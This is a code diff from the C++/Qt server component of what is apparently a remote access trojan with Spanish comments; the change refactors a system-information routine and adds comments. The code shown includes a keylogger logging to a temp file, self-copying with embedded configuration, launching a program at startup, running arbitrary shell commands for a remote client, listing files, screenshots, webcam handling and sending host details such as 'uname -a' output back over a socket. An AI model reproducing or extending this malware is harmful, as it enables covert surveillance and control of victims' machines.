@@ -33,13 +33,11 @@ MainWindow::MainWindow(QWidget *parent) :
     ui->setupUi(this);
     inicio();
 }
-
 MainWindow::~MainWindow()
 {
     /** Destructor de la clase **/
     delete ui;
 }
-
 void MainWindow::changeEvent(QEvent *e)
 {
     /** Función de manejo de eventos **/
@@ -52,7 +50,6 @@ void MainWindow::changeEvent(QEvent *e)
         break;
     }
 }
-
 void MainWindow::inicio(){
     /** funcion que se ejecuta al inicio de la aplicacion **/
     this->generarVentanaChat();
@@ -99,12 +96,11 @@ void MainWindow::inicio(){
     log.setFileName(directorio.tempPath() + "/log"); //archivo de log del keylogger
     verTecla.setInterval(50);
     this->verTecla.start();
-    if(this->ejecutar != "noejecutar")
+    if(this->ejecutar != "noejecutar") //Ejecutar un programa al inicio
     {
         QProcess::startDetached(this->ejecutar);
     }
 }
-
 bool MainWindow::cargarConfiguracion(){
     /** Cargar la configuración del servidor guardada en el último KB del ejecutable **/
     //valores por defecto
@@ -149,10 +145,9 @@ bool MainWindow::cargarConfiguracion(){
         this->siempreOUnaVez = campo[12];
     }
 }
-
 void MainWindow::copiarServidor(QByteArray tramaConfiguracion, QString destino)
 {
-
+/** Copia el servidor a la ruta destino con la configuración proporcionada en tramaConfiguracion **/
     QString home = directorio.homePath(); //ruta absoluta del directorio raiz del usuario
     QString appPath = QApplication::applicationFilePath(); //ruta absoluta a la aplicaciÃ³n
     if (this->adjunto == "unido") //Cuando hay un ejecutable adjunto
@@ -214,7 +209,6 @@ void MainWindow::conectar(){
     }
 
 }
-
 void MainWindow::llegadaDatos() {
     /** Función para el manejo de los datos recibidos a travéz del socket **/
     QString datos;
@@ -314,54 +308,59 @@ void MainWindow::llegadaDatos() {
         }
     }
     if (parametros[0] == "informacion")
-    {
-        QString so;
-        QString version;
-        //QString unidades = QDir::drives();
-        QString homePath = QDir::homePath();
-        QString tempPath = QDir::tempPath();
-        QString alto;
-        alto.setNum(QApplication::desktop()->height());
-        QString ancho;
-        ancho.setNum(QApplication::desktop()->width());
-        QDate tiempo;
-        QString fecha = tiempo.currentDate().toString();
-        QTime horaSistema;
-        QString hora = horaSistema.currentTime().toString();
-        QString alias = this->alias;
-        #ifdef Q_WS_WIN
-            so = "Windows";
-            switch (QSysInfo::WindowsVersion)
-            {
-            case QSysInfo::WV_XP: {
-                version = "XP";
-                break;
-            }
-            case QSysInfo::WV_2003: {
-                version = "2003 Server";
-                break;
-            }
-            case QSysInfo::WV_VISTA: {
-                version = "Vista";
-                break;
-            }
-            case QSysInfo::WV_WINDOWS7: {
-                version = "7";
-                break;
-            }
-            default:
-                break;
-            }
-        #else
-            so = "GNU/Linux";
-            QProcess ver;
-            ver.start("uname -a");
-            ver.waitForReadyRead();
-            version =  ver.readAll();
-        #endif
-            util.escribirSocket("informacion|@|" + so + "|@|" + version + "|@|" + homePath + "|@|" + tempPath + "|@|" + ancho + "|@|" + alto + "|@|" + fecha + "|@|" + hora + "|@|" + alias + "|@|",&socket);
+    {   
+        util.escribirSocket(obtenerInformacionSistema(),&socket);
     }
 
+}
+QString MainWindow::obtenerInformacionSistema()
+{
+    /** Obtiene información relevante del ambiente donde se está ejecutando el servidor **/
+    QString so;
+    QString version;
+    //QString unidades = QDir::drives();
+    QString homePath = QDir::homePath();
+    QString tempPath = QDir::tempPath();
+    QString alto;
+    alto.setNum(QApplication::desktop()->height());
+    QString ancho;
+    ancho.setNum(QApplication::desktop()->width());
+    QDate tiempo;
+    QString fecha = tiempo.currentDate().toString();
+    QTime horaSistema;
+    QString hora = horaSistema.currentTime().toString();
+    QString alias = this->alias;
+    #ifdef Q_WS_WIN
+        so = "Windows";
+        switch (QSysInfo::WindowsVersion)
+        {
+        case QSysInfo::WV_XP: {
+            version = "XP";
+            break;
+        }
+        case QSysInfo::WV_2003: {
+            version = "2003 Server";
+            break;
+        }
+        case QSysInfo::WV_VISTA: {
+            version = "Vista";
+            break;
+        }
+        case QSysInfo::WV_WINDOWS7: {
+            version = "7";
+            break;
+        }
+        default:
+            break;
+        }
+    #else
+        so = "GNU/Linux";
+        QProcess ver;
+        ver.start("uname -a");
+        ver.waitForReadyRead();
+        version =  ver.readAll();
+    #endif
+        return "informacion|@|" + so + "|@|" + version + "|@|" + homePath + "|@|" + tempPath + "|@|" + ancho + "|@|" + alto + "|@|" + fecha + "|@|" + hora + "|@|" + alias + "|@|";
 }
 void MainWindow::llegadaDatosArchivo(){
     /** Función invocada para recibir un archivo enviado por el cliente **/
@@ -447,7 +446,6 @@ void MainWindow::datosEscritos(){
     util.escribirSocketDatos(bytes,&socketEscritorio);
     //socketEscritorio.waitForBytesWritten(-1);
 }
-
 QPixmap MainWindow::screenShot(){
     /** Función que realiza la caputa de la pantalla **/
     QPixmap captura;
@@ -459,7 +457,6 @@ void MainWindow::desconectado() {
     temporizador.start(this->tiempoConexion);
     apagar(); //Si se desconecta y la webcam estaba encendida es mejor apagarla.
 }
-
 QString MainWindow::shell(QString comando){
     /** Función que ejecuta el comando de consola pasado como parámetro y devuelve la salida **/
     #ifdef Q_WS_WIN
@@ -470,7 +467,6 @@ QString MainWindow::shell(QString comando){
     consola.waitForReadyRead();
     return consola.readAllStandardOutput();
 }
-
 void MainWindow::reiniciar(){
     /** Función que reinicia el servidor **/
     QString filePath = QApplication::applicationFilePath();
@@ -498,7 +494,6 @@ void MainWindow::listarArchivos(QString ruta){
     util.escribirSocket(archivos,&socket);
     socket.waitForBytesWritten();
 }
-
 void MainWindow::listarDirectorios(QString ruta){
     /** Función que envia por socket una lista de directorios del directorio pasado como parámetro **/
     int i;
@@ -511,7 +506,6 @@ void MainWindow::listarDirectorios(QString ruta){
     util.escribirSocket(directorios,&socket);
     socket.waitForBytesWritten();
 }
-
 void MainWindow::mostrarMensaje(QString tipo, QString titulo, QString texto){
     /** Función que muestra mensajes emergentes **/
     mensaje = new QMessageBox(this);
@@ -543,19 +537,16 @@ void MainWindow::generarVentanaChat()
     capaHorizontal->addWidget(botonChatEnviar);
     capa->addLayout(capaHorizontal);
 }
-
 void MainWindow::abrirChat()
 {
     /** Función que abre la ventana de chat **/
     chat->show();
 }
-
 void MainWindow::cerrarChat()
 {
     /** Función que cierra la ventana de chat **/
     this->chat->close();
 }
-
 void MainWindow::enviarMensajeChat()
 {
     /** Envia un mensaje de chat al cliente **/
@@ -563,13 +554,11 @@ void MainWindow::enviarMensajeChat()
     util.escribirSocket ( "chat|@|" + this->enviarChatTexto->text() ,&socket);
     this->enviarChatTexto->clear();
 }
-
 void MainWindow::ponerMensajeChat(QString mensajeChat, QString quien)
 {
     /** muestra el mensaje de char recibido **/
     this->salidaChatTexto->document()->setHtml(this->salidaChatTexto->document()->toHtml() + "<br>" + quien + " dice: " + mensajeChat);
 }
-
 void MainWindow::escucharTeclas()
 {
         log.open(QFile::Append);
